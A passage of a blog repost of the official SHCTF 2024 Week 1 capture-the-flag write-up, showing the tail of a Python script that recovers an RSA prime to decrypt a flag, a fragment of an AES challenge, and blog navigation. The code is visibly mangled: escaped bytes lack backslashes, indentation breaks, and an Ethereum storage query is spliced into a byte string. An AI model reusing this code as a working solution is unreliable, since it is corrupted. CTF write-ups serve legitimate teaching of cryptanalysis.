587682058314915471307923755715428788638634300872408087916288745237852083576968681013764877646877289262026854782255141434805121509775923799604299891162530112557931041695494035876437072363827072790300504458703299756480581043027342577811</span><br><span class="line">t = 786699786866467436790075506076086854735027138153074424854186047828932863337885476336794620298737490235145874475196933459185319123588161523141227394517491113980132701124357536717210954797397468992341668471278315484594606850091171557027</span><br><span class="line">e = 65537</span><br><span class="line">for tmp in trange(2**14,2**15-1):</span><br><span class="line">    if isPrime(tmp):</span><br><span class="line">        p = (leak+tmp)*gmpy2.invert(r,t) % t</span><br><span class="line">        try:</span><br><span class="line">            d = gmpy2.invert(e,p-1)</span><br><span class="line">            m = pow(c,d,p)</span><br><span class="line">            flag = long_to_bytes(m)</span><br><span class="line">            if b&#x27;SHCTF&#x27; in flag:</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line">        </span><br><span class="line">except:</span><br><span class="line">            pass</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import os</span><br><span class="line">c = b&#x27;[x1bx0cxdbx9dxc0xe4Wxe1xddixd8.xbaW-x80xe1xc4Lx9exc3Lx9ex0bxadvx94-=xa2xf4x98xf9xa2xfdxbcxc5xc9xf7xd4x88V:</span><br><span class="line">xfexedxf6+&#x27;</span><br><span class="line">iv = b&#x27;M eth.getStorageAt(&quot;0x3948DF4C50B1671eaa6b22876Ea746899a6916C1&quot;,0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563)</span><br><span class="line">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><br></pre></td></tr></table></figure>
+
+
+---
+## 附图
+
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+
+---
+
+> **转载声明**：本文转载自 [Des-CTF-Knowledge](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge)（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。
+> 原文链接：[https://www.ctfiot.com/209352.html](https://www.ctfiot.com/209352.html)
+> 仓库原文：[CTF大赛WP集合/articles/SHCTF-2024-Week1_官方WP.full.md](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/SHCTF-2024-Week1_%E5%AE%98%E6%96%B9WP.full.md)
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/shctf2024-week1/">shctf2024-week1</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/01/01/ctf-kb/wp/Misc/SECCON_2024-%E5%8A%A8%E6%80%81%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%8F%92%E6%A1%A9trace_%E7%A0%B4%E8%A7%A3%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E6%B7%B7%E6%B7%86/" title="SECCON 2024 - 动态二进制插桩 trace 破解函数式编程混淆"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">SECCON 2024 - 动态二进制插桩 trace 破解函数式编程混淆</div></div></a></div><div class="next-post pull-right"><a href="/2024/01/01/ctf-kb/wp/Misc/SCTF_2024_writeup_by_Arr3stY0u/" title="SCTF 2024 writeup by Arr3stY0u"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">SCTF 2024 writeup by Arr3stY0u</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
